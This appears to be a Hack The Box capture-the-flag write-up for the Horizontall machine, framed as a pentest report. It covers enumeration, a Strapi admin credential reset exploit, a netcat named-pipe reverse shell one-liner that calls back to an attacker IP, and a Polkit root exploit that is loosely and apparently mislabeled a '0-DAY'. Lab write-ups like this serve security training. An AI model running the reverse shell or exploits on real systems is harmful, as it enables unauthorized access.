# HTB - Horizontall

In this penetration test report, I'll describe the various commands and exploits used during the assessment of the target system (Horizontall) (`10.10.11.105`). The test aimed to identify vulnerabilities and potential exploits, as well as gain unauthorized access to the system. Below is an overview of the commands and their significance.

## Initial Enumeration

### Nmap Scan

```bash
nmap -sV --script /usr/share/nmap/scripts/vulners.nse 10.10.11.105 -p-
```

- The scan revealed open SSH (22) and HTTP (80) ports.

## Web Application Assessment

### Dirb Scan

- A `dirb` scan was conducted to enumerate the web server; however, it did not yield any results.

### Source Code Analysis

- The source code of the web application was analyzed, revealing references to "portal-vue 2.1.7" and a JS file at `api-prod.horizontall.htb/reviews`.

## Web Application Interaction

- In /reviews we can analyse we can see the account names

```
wail  
doe  
john
```

- The application was identified as Strapi.

## Exploiting Strapi

- An exploit for Strapi was found at [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239).
- The exploit allowed the tester to obtain new credentials: `admin:SuperStrongPassword1`.
- We can now connect as admin

### Gaining a Reverse Shell

- The web application had a file upload feature at `http://api-prod.horizontall.htb/admin/plugins/upload`.
- Multiple attempts were made to gain a reverse shell on the server using various shell commands.
- The successful command used was:
  
  ```bash
  rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.85 4546 >/tmp/f
  ```

### Polkit 0-DAY Privilege Escalation

- We utilized a recent Polkit exploit Proof-of-Concept (PoC) found at [https://packetstormsecurity.com/files/165728/cve-2021-4043-poc.c](https://packetstormsecurity.com/files/165728/cve-2021-4043-poc.c).
- The PoC was compiled and executed, successfully granting root access.

# Conclusion

This penetration test involved Nmap scans, source code analysis, exploiting a Strapi vulnerabilitie and a 0-DAY exploit. 
